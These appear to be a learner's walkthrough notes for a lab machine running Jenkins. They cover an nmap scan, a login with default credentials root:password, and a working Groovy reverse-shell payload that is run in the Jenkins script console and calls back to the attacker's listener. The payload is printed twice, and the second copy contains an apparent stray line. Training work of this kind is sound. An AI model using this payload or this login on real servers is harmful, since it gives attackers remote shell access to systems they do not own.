[[ping]] the host
sudo nmap -sC -sV -p- --min-rate=1000 \[host]
*open in browser*
http://10.129.25.252:8080
root:password
*check current version of Jenkins in bottom right corner. Specifically if the currently installed version has any known CVE's or attack methods published on the Internet. Unfortunately, this is not our case*
http://10.129.25.252:8080/script
*create a payload in Groovy to execute the reverse shell connection. Specifically, we will make the remote server connect to us by specifying our IP address and the port that we will listen on for new connections.*
String host="{your_IP}";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket
s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e)
{}};p.destroy();s.close();

*If on VPN: In order to get your IP address for the currently deployed VPN connection, you need to open a new terminal tab or window and input:* 
ip a | grep tun0 

*`String host="{your_IP}";` : Specify the IP address for the target to connect back to.
`int port=8000;` : Specify the port on which the attacker will listen on.
`String cmd="/bin/bash";` : Specify the shell type the attacker expects. 
 Since the target is Linux-based, we are using `/bin/bash`.
If the target was using Windows, it would have been `cmd.exe`. 

*The rest of the script will instruct the target to create a cmd process which will initialize a connection request to the provided host and port (us, in this case). Our listener script will be running on the specified port and catch the connection request from the target, successfully forming a reverse shell between the target and attacker hosts. Before running the command pasted in the Jenkins Script Console, we need to make sure our listener script is up and running on the same port as specified in the command above, for int port=8000 . To achieve this, we will use a tool called netcat or nc for short. Looking at the Wikipedia article for netcat, we can learn more about its' use.*

*may need to fix code*
String host="10.10.15.206";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket
s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream
OutputStream po = p.getOutputStream();
OutputStream so = s.getOutputStream();
while(!s.isClosed())
{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe
.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

*go back to netcat*
whoami
id
